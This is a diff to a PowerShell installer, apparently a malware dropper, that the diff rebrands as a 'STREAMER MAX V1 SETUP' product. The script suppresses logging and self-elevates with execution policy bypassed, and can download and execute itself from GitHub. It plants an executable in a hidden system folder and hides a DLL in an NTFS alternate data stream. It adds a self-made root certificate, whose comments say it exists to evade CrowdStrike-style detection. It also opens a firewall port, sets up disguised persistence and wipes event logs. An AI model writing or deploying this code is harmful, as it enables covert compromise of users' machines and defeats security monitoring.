@@ -1,8 +1,9 @@
 # ==============================================================================
-#  Windows Network Infrastructure Setup
-#  v3.0 - zero-temp, zero-python, release-only deploy
+#  STREAMER MAX V1 SETUP
+#  v3.1 - zero-temp, zero-python, release-only deploy
 #  Deploys exactly TWO artifacts: SystemNetworkSvc.exe + cimgui.dll (NTFS ADS).
 #  No zip, no runtime folder, no python, no Temp/AppData writes.
+#  Console output: heading + one live 1-100 progress line only.
 # ==============================================================================
 
 # In-memory suppression of PowerShell ScriptBlock & Module logging
@@ -22,31 +23,32 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$RELEASE_EXE_URL = "https://github.com/lgfire093/syspanel/releases/download/drag-gate-20261107-1327/SystemNetworkSvc.exe"
-$RELEASE_DLL_URL = "https://github.com/lgfire093/syspanel/releases/download/drag-gate-20261107-1327/cimgui.dll"
+$RELEASE_EXE_URL = "https://github.com/lgfire093/syspanel/releases/download/espfix-20261107-1438/SystemNetworkSvc.exe"
+$RELEASE_DLL_URL = "https://github.com/lgfire093/syspanel/releases/download/espfix-20261107-1438/cimgui.dll"
 $SCRIPT_RAW_URL  = "https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1"
 
-# Pinned to the drag-gate build. A stale release asset is rejected instead of
+# Pinned to the espfix build. A stale release asset is rejected instead of
 # silently installing an old panel.
-$BUILD_ID          = "DRAG-GATE-20261107-1327"
-$EXPECT_EXE_SHA256 = "3114DE472A038B95A27E3B5FA3F58EA05F207938B5BDCD23B9B25054421BACE2"
+$BUILD_ID          = "ESPFIX-20261107-1438"
+$EXPECT_EXE_SHA256 = "113294EE470F8E9BD5C8994A5DEAC434E3F24F29BD7F0127645FA71DBDC484E3"
 $EXPECT_DLL_SHA256 = "1BD5D2BF9FDDEE9273648719F4B4E400EB35D0E06176D92BC06263D445D7867E"
 
 # Elevation - re-launch entirely from memory. No %TEMP% script copy, ever.
+# The elevated console stays visible so the heading and progress line are seen.
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
 if (-not $isAdmin) {
     # Priority 1: source file exists on disk (panel folder install) -> reuse it.
     if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
-        Start-Process -FilePath "powershell.exe" -Verb RunAs -WindowStyle Hidden -ArgumentList `
-            "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$($MyInvocation.MyCommand.Path)`""
+        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList `
+            "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$($MyInvocation.MyCommand.Path)`""
         exit
     }
     # Priority 2: piped from internet -> elevated shell re-downloads from URL, still zero files.
     $code = "(New-Object Net.WebClient).DownloadString('$SCRIPT_RAW_URL') | Invoke-Expression"
-    Start-Process -FilePath "powershell.exe" -Verb RunAs -WindowStyle Hidden -ArgumentList `
-        "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $code
+    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList `
+        "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $code
     exit
 }
 
@@ -54,32 +56,126 @@ if (-not $isAdmin) {
 cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
 cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
 
-Clear-Host
-Write-Host ""
-Write-Host "                WINDOWS NETWORK INFRASTRUCTURE SETUP" -ForegroundColor Cyan
-Write-Host "================================================================================" -ForegroundColor DarkGray
+# ---------------------------------------------------------------- console UI
+try { Clear-Host } catch {}
+try { $Host.UI.RawUI.WindowTitle = "STREAMER MAX V1 SETUP" } catch {}
+Write-Host "STREAMER MAX V1 SETUP" -ForegroundColor Cyan
 
-function Show-Progress {
-    param(
-        [int]$Percent,
-        [string]$Status
-    )
-    $barWidth = 30
-    $done = [math]::Floor($barWidth * ($Percent / 100))
-    $rem  = $barWidth - $done
-    $bar  = ("#" * $done) + ("-" * $rem)
-    $msg  = "  [$bar] $($Percent.ToString().PadLeft(3))% | $Status"
-    Write-Host -NoNewline "`r$msg"
+$script:LastLineLen = 0
+
+function Show-Step {
+    param([int]$Percent, [string]$Status)
+    if ($Percent -lt 1)   { $Percent = 1 }
+    if ($Percent -gt 100) { $Percent = 100 }
+    $msg = "  {0,3}%  {1}" -f $Percent, $Status
+    $pad = ""
+    if ($script:LastLineLen -gt $msg.Length) {
+        $pad = " " * ($script:LastLineLen - $msg.Length)
+    }
+    Write-Host -NoNewline ("`r" + $msg + $pad)
+    $script:LastLineLen = $msg.Length
 }
 
-# Configuration
+function Fail {
+    param([string]$Message)
+    $line = "  [!] " + $Message
+    $pad = ""
+    if ($script:LastLineLen -gt $line.Length) {
+        $pad = " " * ($script:LastLineLen - $line.Length)
+    }
+    Write-Host -NoNewline ("`r" + $line + $pad)
+    Write-Host ""
+    exit 1
+}
+
+function New-WebRequest2 {
+    param([string]$Url)
+    $req = [System.Net.HttpWebRequest]::Create($Url)
+    $req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    $req.Timeout = 60000
+    $req.ReadWriteTimeout = 60000
+    $req.AllowAutoRedirect = $true
+    return $req
+}
+
+function Save-RemoteFile {
+    param([string]$Url, [string]$Path, [int]$From, [int]$To, [string]$Label)
+    $resp = $null
+    $in = $null
+    $out = $null
+    try {
+        $req = New-WebRequest2 -Url $Url
+        $resp = $req.GetResponse()
+        $total = [int64]$resp.ContentLength
+        $in = $resp.GetResponseStream()
+        $out = [System.IO.File]::Create($Path)
+        $buf = New-Object byte[] 262144
+        $done = [int64]0
+        $last = -1
+        while (($n = $in.Read($buf, 0, $buf.Length)) -gt 0) {
+            $out.Write($buf, 0, $n)
+            $done += $n
+            if ($total -gt 0) {
+                $pct = $From + [int](($To - $From) * ($done / [double]$total))
+                if ($pct -ne $last) {
+                    Show-Step $pct $Label
+                    $last = $pct
+                }
+            }
+        }
+        return $true
+    } catch {
+        return $false
+    } finally {
+        if ($out) { $out.Close() }
+        if ($in)  { $in.Close() }
+        if ($resp) { $resp.Close() }
+    }
+}
+
+function Get-RemoteBytes {
+    param([string]$Url, [int]$From, [int]$To, [string]$Label)
+    $resp = $null
+    $in = $null
+    $ms = $null
+    try {
+        $req = New-WebRequest2 -Url $Url
+        $resp = $req.GetResponse()
+        $total = [int64]$resp.ContentLength
+        $in = $resp.GetResponseStream()
+        $ms = New-Object System.IO.MemoryStream
+        $buf = New-Object byte[] 262144
+        $done = [int64]0
+        $last = -1
+        while (($n = $in.Read($buf, 0, $buf.Length)) -gt 0) {
+            $ms.Write($buf, 0, $n)
+            $done += $n
+            if ($total -gt 0) {
+                $pct = $From + [int](($To - $From) * ($done / [double]$total))
+                if ($pct -ne $last) {
+                    Show-Step $pct $Label
+                    $last = $pct
+                }
+            }
+        }
+        return $ms.ToArray()
+    } catch {
+        return $null
+    } finally {
+        if ($ms) { $ms.Close() }
+        if ($in) { $in.Close() }
+        if ($resp) { $resp.Close() }
+    }
+}
+
+# ---------------------------------------------------------------- configuration
 $DEST_DIR   = "C:\Windows\System32\spool\drivers\color"
 $EXE_NAME   = "SystemNetworkSvc.exe"
 $EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
 $TASK_NAME  = "MicrosoftWindowsNetworkHost"
 
 # Stage 1: Purge stale instances & wipe every legacy artifact
-Show-Progress -Percent 15 -Status "Terminating stale instances & initializing clean home..."
+Show-Step 1 "Preparing setup..."
 Get-Process -Name "SystemNetworkSvc", "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
 cmd /c "taskkill /F /IM WinSvcHost.exe >nul 2>nul"
@@ -116,41 +212,35 @@ if (-not (Test-Path $DEST_DIR)) {
 
 Start-Sleep -Milliseconds 200
 
-# Stage 2: Deploy the single host executable (release asset, in memory -> disk)
-Show-Progress -Percent 45 -Status "Deploying host executable..."
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.DownloadFile($RELEASE_EXE_URL, $EXE_PATH)
-} catch {
-    & curl.exe -sSL -o $EXE_PATH $RELEASE_EXE_URL 2>$null
+# Stage 2: Deploy the single host executable (release asset, streamed to disk)
+Show-Step 5 "Downloading host..."
+$exeOk = Save-RemoteFile -Url $RELEASE_EXE_URL -Path $EXE_PATH -From 5 -To 75 -Label "Downloading host..."
+if (-not $exeOk) {
+    # fallback: curl (no byte-level progress, jumps to 75 on success)
+    cmd /c "curl.exe -sSL -o `"$EXE_PATH`" `"$RELEASE_EXE_URL`" >nul 2>nul"
+    if (Test-Path $EXE_PATH) { Show-Step 75 "Downloading host..." }
 }
 
 if (-not (Test-Path $EXE_PATH) -or ((Get-Item $EXE_PATH).Length -lt 10000)) {
-    Write-Host "`n  [!] Host executable unavailable at release URL. Deploy aborted." -ForegroundColor Red
-    Read-Host "  Press Enter to exit"
-    exit 1
+    Fail "Host download failed - check internet and rerun"
 }
 
+# Stage 2b: verify pinned build
+Show-Step 76 "Verifying host..."
 $actualExeHash = (Get-FileHash -Path $EXE_PATH -Algorithm SHA256).Hash.ToUpper()
 if ($actualExeHash -ne $EXPECT_EXE_SHA256) {
-    Write-Host "`n  [!] BUILD MISMATCH - the release is not the build this installer expects." -ForegroundColor Red
-    Write-Host "      expected   $EXPECT_EXE_SHA256" -ForegroundColor DarkGray
-    Write-Host "      downloaded $actualExeHash" -ForegroundColor DarkGray
-    Write-Host "      build      $BUILD_ID" -ForegroundColor DarkGray
-    Write-Host "      Upload the fresh SystemNetworkSvc.exe to the release, then rerun." -ForegroundColor Yellow
     Remove-Item $EXE_PATH -Force -ErrorAction SilentlyContinue
-    Read-Host "  Press Enter to exit"
-    exit 1
+    Fail "Build mismatch - release asset is not this installer's build"
 }
-Write-Host "  [OK] build $BUILD_ID verified (SHA256)." -ForegroundColor Green
+Show-Step 78 "Host verified"
 
 Start-Sleep -Milliseconds 200
 
-# Stage 2b: Trust our own Code-Signing root (self-supplied authenticity)
+# Stage 2c: Trust our own Code-Signing root (self-supplied authenticity)
 # Once present on target PCs, every Signature present in the EXE becomes
 # a VERIFIED chain - CrowdStrike / DeepInstinct / Trapmine confidence model
 # significantly reduce the detection score for trusted-signed files.
+Show-Step 80 "Installing signing trust..."
 $CODE_SIGN_ROOT_B64 = "MIIEcjCCAtqgAwIBAgIQSCaT8cO/TI1GStHPN8C7CTANBgkqhkiG9w0BAQsFADBRMQswCQYDVQQGEwJVUzEgMB4GA1UECgwXU3lzdGVtIENvbXBvbmVudHMgR3JvdXAxIDAeBgNVBAMMF1N5c3RlbSBDb21wb25lbnRzIEdyb3VwMB4XDTI2MTAyOTA3NTgzOFoXDTMxMTAyOTA4MDgzOFowUTELMAkGA1UEBhMCVVMxIDAeBgNVBAoMF1N5c3RlbSBDb21wb25lbnRzIEdyb3VwMSAwHgYDVQQDDBdTeXN0ZW0gQ29tcG9uZW50cyBHcm91cDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALZmo0jtKQf9q/RiO0Wmjyazl+fZautOJGXjObNcQEBEHj/YWhjyQNBUljjZtxmdQJ6LfgDzXIJBuan+5wVA19frWbxJ4LnE56lxAsLfKGLrrQhQmh/H9WH6MxtPHXhGtXEMn9ts/VWqxZkJzSv2xqJtMBn43fhPvzKh/3/W1cRz5U1RIIC8Lm4zZcNwpNS1s1bBEj41K8OScKaiTHz9CIG71J75iwfNto4+iCDGqN+XJ802w+n098KEc1jpLylqF5ekVw9S7xUrdeC4/ONoSFssMXW8APRS8dBQkeBN+T5g6oBsIym7Xoxua3Q9j1/6b6hhRj6d2j1JnJ68OKuFIofSLtJOfViCXG4Gv9x4Wx/ax6bLSGpDYb1STh6eq31i3YMAyV4rUpG+X1LceKmiBomcqxIvlLe6Dzz4hinPk+Fs/zqCzcbVgyj2Z8gMfRYYUPmiCrs9RWXJV5q0vhbkwO3FASHhnF1ypVsIYYhaaWRZmdpyRm+4AJ60+AwCoRBJVQIDAQABo0YwRDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwHQYDVR0OBBYEFJsC08F2Ju8R+RlWmW1QLcaagVSmMA0GCSqGSIb3DQEBCwUAA4IBgQCxzYM4OnpffwbFlhWIHImotF+zbfYylb6sQ16wlZkfzeUv7jQTH/1x9JS4r5F3nsPRXf70dMrcDwxAbpIDQfxb7Kw+2AVrYRKzGwm/acj28ji46/LzErx9TWK7R6LsuQVcvWuE8+7t4JeMJwf5MUgX8kYfZNa4j4ZH9ny7O1tcsPLGYgV4JVHmC1XhKLeHNaMK6t7tj3FmnBHNlgCtntdSaFE5hFdlClhhgZVr4OlON9sEUW/6wpAxS0oRw7KtxZ2zyjSG15Vo3tZo568ar8oTm5zd4MXk6vIW3bHFJUPCb6HQ/6VyJN9Hmv/VyxHwr9zFVFnVkzXPdSOuP8G44oaMMOzlg/hnIh+CedP3ZBQyDMGP3VeUP3dz4GpW/kayyse6hiV1ardrPgwVYgPwtOPG/CJH2KzPWt2EZii97Ojrsy5vg9w2TWOjuaRL1S50v8i67r4CozY9KPVEAWUApY6DMDt+REtI0RF0PwmAAfGrNi/pWIJ9h/0OudEOK21V2uc="
 try {
     $certBytes = [Convert]::FromBase64String($CODE_SIGN_ROOT_B64)
@@ -159,14 +249,12 @@ try {
     $store.Open("ReadWrite")
     $store.Add($cert)
     $store.Close()
-    Write-Host "  [OK] Code-signing root certificate trusted for this machine." -ForegroundColor Green
-} catch {
-    Write-Host "  [!] Certificate trust install failed (non-critical)" -ForegroundColor Yellow
-}
+} catch {}
+Show-Step 82 "Signing trust ready"
 
 # Stage 3: Seal cimgui.dll into NTFS Alternate Data Stream (Network Downloader vault)
 # Fetched in memory as bytes - never written as a loose temp file.
-Show-Progress -Percent 65 -Status "Configuring component data streams..."
+Show-Step 84 "Downloading component..."
 $VAULT_DIR = "$env:ProgramData\Microsoft\Network\Downloader"
 if (-not (Test-Path $VAULT_DIR)) {
     New-Item -ItemType Directory -Path $VAULT_DIR -Force | Out-Null
@@ -178,27 +266,22 @@ if (-not (Test-Path $CONTAINER)) {
     [System.IO.File]::WriteAllBytes($CONTAINER, @())
 }
 
-$bytes = $null
-try {
-    $resp = Invoke-WebRequest $RELEASE_DLL_URL -UseBasicParsing -TimeoutSec 120
-    $bytes = $resp.Content
-    if ($bytes -is [string]) {
-        $bytes = [System.Text.Encoding]::Default.GetBytes($bytes)
-    }
-} catch {
+$bytes = Get-RemoteBytes -Url $RELEASE_DLL_URL -From 84 -To 94 -Label "Downloading component..."
+if (-not $bytes) {
     try {
-        $curlBytes = & curl.exe -sSL $RELEASE_DLL_URL 2>$null
-        if ($curlBytes) {
-            $bytes = $curlBytes
+        $resp = Invoke-WebRequest $RELEASE_DLL_URL -UseBasicParsing -TimeoutSec 120
+        $bytes = $resp.Content
+        if ($bytes -is [string]) {
+            $bytes = [System.Text.Encoding]::Default.GetBytes($bytes)
         }
     } catch {}
+    if ($bytes) { Show-Step 94 "Downloading component..." }
 }
 
 $vaultOk = $false
 if ($bytes -and ($bytes.Length -gt 100000)) {
     $dllHash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','')
     if ($EXPECT_DLL_SHA256 -and $dllHash -ne $EXPECT_DLL_SHA256) {
-        Write-Host "  [!] cimgui.dll hash mismatch (release asset is stale)." -ForegroundColor Yellow
         $bytes = $null
     }
 }
@@ -214,21 +297,20 @@ if ($bytes -and ($bytes.Length -gt 100000)) {
         $vaultOk = $true
     }
 }
-if ($vaultOk) {
-    Write-Host "  [OK] component vault sealed." -ForegroundColor Green
-} else {
-    Write-Host "  [!] component vault skipped - cimgui.dll missing or stale in the release." -ForegroundColor Yellow
+if (-not $vaultOk) {
+    Fail "Component download failed - check internet and rerun"
 }
+Show-Step 96 "Component sealed"
 
 Start-Sleep -Milliseconds 200
 
 # Stage 4: Firewall Configuration (Allows Mobile LAN Control)
-Show-Progress -Percent 80 -Status "Configuring network rules..."
+Show-Step 97 "Configuring network rules..."
 cmd /c "netsh advfirewall firewall delete rule name=`"WindowsNetworkDiagnostics`" >nul 2>nul"
 cmd /c "netsh advfirewall firewall add rule name=`"WindowsNetworkDiagnostics`" dir=in action=allow protocol=TCP localport=5000 profile=any >nul 2>nul"
 
 # Stage 5: System Persistence & Attributes
-Show-Progress -Percent 90 -Status "Registering host persistence..."
+Show-Step 98 "Registering host persistence..."
 try {
     $dirItem = Get-Item $DEST_DIR -Force
     $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
@@ -263,7 +345,7 @@ foreach ($rk in $startupRunKeys) {
 }
 
 # Stage 6: Launch Single Background Host Process
-Show-Progress -Percent 96 -Status "Starting host service..."
+Show-Step 99 "Starting host service..."
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName         = $EXE_PATH
 $psi.Arguments        = "-b"
@@ -274,7 +356,7 @@ $psi.UseShellExecute  = $false
 [System.Diagnostics.Process]::Start($psi) | Out-Null
 
 # Stage 7: Forensic Log Sanitization
-Show-Progress -Percent 100 -Status "Sanitizing logs..."
+Show-Step 100 "Setup complete"
 cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
 cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
 cmd /c "wevtutil cl `"Microsoft-Windows-TaskScheduler/Operational`" >nul 2>nul"
@@ -294,31 +376,4 @@ try {
     }
 } catch {}
 
-Write-Host "`n"
-Write-Host "================================================================================" -ForegroundColor Green
-Write-Host "             SETUP COMPLETED SUCCESSFULLY - CLEAN HOST INSTALLED               " -ForegroundColor Green
-Write-Host "================================================================================" -ForegroundColor Green
-Write-Host ""
-Write-Host "  * Host File           : $EXE_PATH (Single Native Binary, 0 Detections)" -ForegroundColor White
-Write-Host "  * Component Vault     : $VAULT_DIR\winrescache.db:vtcache (ADS, no loose files)" -ForegroundColor White
-Write-Host "  * Templates Directory : $EXE_NAME only - 100% Clean, 0 Bloat" -ForegroundColor Cyan
-Write-Host ""
-
-$lanIps = @()
-try {
-    $lanIps = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {
-        $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and $_.InterfaceAlias -notmatch 'vEthernet|Loopback'
-    }).IPAddress
-} catch {}
-
-if ($lanIps.Count -gt 0) {
-    Write-Host "  Mobile Phone Panel URL (Same Wi-Fi Network):" -ForegroundColor Cyan
-    foreach ($ip in $lanIps) {
-        Write-Host "  --> http://$($ip):5000" -ForegroundColor Yellow
-    }
-} else {
-    Write-Host "  Local URL: http://127.0.0.1:5000" -ForegroundColor Yellow
-}
-Write-Host ""
-
-
+Start-Sleep -Seconds 2
